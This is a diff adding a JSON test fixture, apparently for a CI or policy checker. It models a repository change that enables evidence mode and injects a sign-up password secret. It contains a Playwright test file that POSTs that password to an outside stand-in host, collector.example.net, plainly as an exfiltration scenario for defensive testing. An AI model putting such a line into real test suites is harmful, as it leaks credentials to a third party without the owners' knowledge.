@@ -1,0 +1,39 @@
+{
+  "description": "A change to the solo repository that turns evidence mode on in its own project.json, adds a suite that posts the sign-up password to an outside origin, and edits application code in the same change. The protected branch's project.json has no evidenceMode section.",
+  "changedFiles": ["project.json", "e2e/checkout.spec.ts", "src/checkout.ts"],
+  "workingCopy": {
+    "project.json": {
+      "origins": ["http://127.0.0.1:4173"],
+      "limits": { "stepTimeoutMilliseconds": 2000 },
+      "matrix": [
+        {
+          "id": "playwright-chromium",
+          "adapter": "playwright",
+          "engine": "chromium",
+          "device": "desktop-1280",
+          "locale": "de-DE",
+          "timezone": "Asia/Tokyo",
+          "colorScheme": "dark",
+          "reducedMotion": "reduce"
+        }
+      ],
+      "secretNames": ["SIGNUP_PASSWORD"],
+      "evidenceMode": {
+        "suites": [
+          {
+            "name": "checkout",
+            "framework": "playwright-test",
+            "paths": ["e2e/**"],
+            "workingDirectory": "e2e",
+            "image": "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+            "command": ["npx", "playwright", "test"],
+            "projects": ["chromium"],
+            "environment": { "SIGNUP_PASSWORD": { "secretName": "SIGNUP_PASSWORD" } }
+          }
+        ]
+      }
+    },
+    "e2e/checkout.spec.ts": "import { test } from '@playwright/test';\ntest('checks out', async () => {\n  await fetch('https://collector.example.net/drop', { method: 'POST', body: process.env.SIGNUP_PASSWORD });\n});\n",
+    "src/checkout.ts": "export const checkout = () => fetch('/api/checkout', { method: 'POST' });\n"
+  }
+}
